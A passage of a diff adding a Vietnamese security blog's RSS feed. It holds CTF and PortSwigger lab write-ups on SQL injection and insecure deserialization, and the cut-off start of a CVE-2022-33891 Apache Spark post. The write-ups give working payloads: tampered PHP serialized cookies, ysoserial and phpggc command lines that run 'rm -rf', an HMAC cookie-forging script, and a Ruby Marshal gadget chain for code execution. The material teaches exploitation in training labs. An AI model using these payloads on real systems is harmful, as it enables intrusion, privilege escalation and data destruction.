+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
+</code></pre><p></p>
+<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
+Payload:</p>
+<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
+]]></description>
+</item>
+<item>
+    <title>PortSwigger - Insecure Deserialization</title>
+    <link>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</link>
+    <pubDate>Wed, 20 Dec 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</guid>
+    <description><![CDATA[<blockquote>
+<p>Thông thường cấu trúc của <code>Serialize Data</code> có dạng:
+<code>O: strlen(object name): object name: object size: {... elements...}</code></p>
+</blockquote>
+<h2 id="1--modifying-serialized-objects">1.  Modifying serialized objects</h2>
+<h3 id="description">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
+You can log in to your own account using the5 following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion">Exploitaion</h3>
+<p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
+<p>Đăng nhập bằng tài khoản <code>wiener:peter</code>.</p>
+<p></p>
+<p>Ta thấy <code>session cookie</code> là một object <code>User</code> sau khi được serialized và base64-encode. Để ý object <code>User</code> này có thuộc tính <code>admin</code> hiện có giá trị boolean <code>0</code> tức là <code>false</code>.</p>
+<p></p>
+<p>Vì user này không phải <code>admin</code> → không vào được trang <code>/admin</code>.
+=&gt; Ta thử thay đổi giá trị boolean ở serialized session cookie thành <code>1</code></p>
+<p></p>
+<p>End-code base64</p>
+<p></p>
+<p>Edit cookie của trang web và load lại trang:</p>
+<p></p>
+<p>=&gt; <code>User</code> đã đăng nhập được vào trang <code>/admin</code>
+Tiến hành xóa user <code>Carlos</code>.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="2-modifying-serialized-data-types">2. Modifying serialized data types</h2>
+<h3 id="description-1">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-1">Exploitaion</h3>
+<p>Tương tự lab 1, session cookie cũng được serialize từ <code>User</code> object</p>
+<p></p>
+<p>Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;s: 32: &#34;t2blplwd06k5lr3coyxnjzy7ne355ge5&#34;;}
+</code></pre><p>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator <code>==</code> để authenticate như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_SESSION)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user[<span style="color:#e6db74">&#39;access_token&#39;</span>] <span style="color:#f92672">==</span> $access_token) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Authenticate successfully
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Như vậy ta sẽ bypass bằng cách chỉnh <code>access_token</code> về số nguyên 0 → bypass được <code>==</code> vì 0 <code>==</code> <code>string</code> sẽ trả về <code>true</code>. Serialized object sau khi chỉnh như sau:</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;i: 0;}
+</code></pre><p>Endcode base64 và edit cookie</p>
+<p></p>
+<p>Đăng nhập vào <code>admin</code> panel thành công và tiến hành xóa user <code>Carlos</code>.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</h2>
+<h3 id="description-2">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter
+You also have access to a backup account: gregg:rosebud</p>
+</blockquote>
+<h3 id="exploitaion-2">Exploitaion</h3>
+<p>Tương tự 2 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p></p>
+<p>Lần này ứng dụng có thêm thuộc tính <code>avatar_link</code>. Mà ứng dụng này có chức năng <code>Delete account</code> =&gt; Khi ấn vào nút <code>Delete account</code> thì ứng dụng sẽ xóa cả <code>avatar</code> của người dùng.</p>
+<p>Nếu ta thay đổi đường dẫn tại thuộc tính <code>avatar_link</code> thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi <code>Delete account</code>.</p>
+<p>Chỉnh sửa <code>avatar_link</code> thành <code>/home/carlos/morale.txt</code> để tiến hành xóa file.</p>
+<pre tabindex="0"><code>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;bqp5e5wpdhhaz3rt0knb1u6uowozl5se&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và Edit cookie.</p>
+<p></p>
+<p></p>
+<p>Load lại trang và Solved.</p>
+<p></p>
+<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
+<h3 id="description-3">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-3">Exploitaion</h3>
+<p>Tương tự 3 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p>Khi ấn vào <code>view-source</code> ta thấy một đường dẫn:</p>
+<p></p>
+<p>Kiểm tra thử đường dẫn xem có đọc được source code không:</p>
+<p></p>
+<p>Không có gì phản hồi. Ta thử thêm dấu <code>~</code> vào cuối đường dẫn, ta xem được mã nguồn file <code>/libs/CustomTemplate.php</code>.</p>
+<p>Mã nguồn file <code>/libs/CustomTemplate.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomTemplate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $template_file_path;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $lock_file_path;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($template_file_path) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span> <span style="color:#f92672">=</span> $template_file_path;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span> <span style="color:#f92672">=</span> $template_file_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.lock&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isTemplateLocked</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTemplate</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveTemplate</span>($template) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isTemplateLocked</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Carlos thought this would be a good idea
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Một class <code>CustomTemplate</code> được định nghĩa với 2 thuộc tính <code>template_file_path</code> và <code>lock_file_path</code>. Ta chỉ cần quan tâm <a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener noreffer">magic method</a>
+ <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
+<p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
+<pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và edit cookie:</p>
+<p></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
+<h3 id="description-4">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
+To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<p>Cookie của ứng dụng là một Java serialize Object</p>
+<p></p>
+<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
+ để khai thác.</p>
+<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
+</span></span></code></pre></div><p></p>
+<p>Sử dụng payload vừa tạo và send request</p>
+<p></p>
+<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
+<p></p>
+<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
+<h3 id="description-5">Description</h3>
+<blockquote>
+<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
+To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
+</p>
+<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
+<p></p>
+<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
+<p></p>
+<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
+Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
+<p></p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><p></p>
+<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
+<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
+<p></p>
+<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
+<p></p>
+<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
+<pre tabindex="0"><code>&lt;?php
+$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
+$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
+$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);
+
+$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
+print_r($cookie);
+?&gt;
+</code></pre><p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
+<h3 id="description-6">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
+To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Session cookie là một <code>Ruby deserialize Object</code></p>
+<p></p>
+<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
+.</p>
+<p>Script có nội dung như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
+</span></span></code></pre></div><p></p>
+<p>Thay cookie và gửi request</p>
+<p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>CVE-2022-33891</title>
+    <link>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Apache Spark UI cho phép kích hoạt tính năng danh sách điều khiển truy cập (ACL) thông qua tùy chọn cấu hình <code>spark.acls.enable</code>.
+Trong đó tồn tại một bộ lọc xác thực có chức năng kiểm tra xem người dùng có quyền truy cập để xem hoặc sửa đổi ứng dụng hay không. Nếu ACL được bật, một đường dẫn mã trong <code>HttpSecurityFilter</code> có thể cho phép hacker thực hiện hành vi mạo danh bằng cách cung cấp tên người dùng tùy ý. Với cấu hình <code>spark.acls.enable</code> <code>true</code> sẽ kích hoạt lỗi chèn lệnh tùy ý. Đoạn mã này có nhiệm vụ kiểm tra quyền của người dùng bằng cách sử dụng lệnh bash shell kết hợp với lệnh unix id. Đoạn mã tồn tại lỗi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#a6e22e">def</span> <span style="color:#a6e22e">getUnixGroups</span>(<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">String</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">Set</span>[<span style="color:#a6e22e">String</span>] <span style="color:#f92672">=</span> {
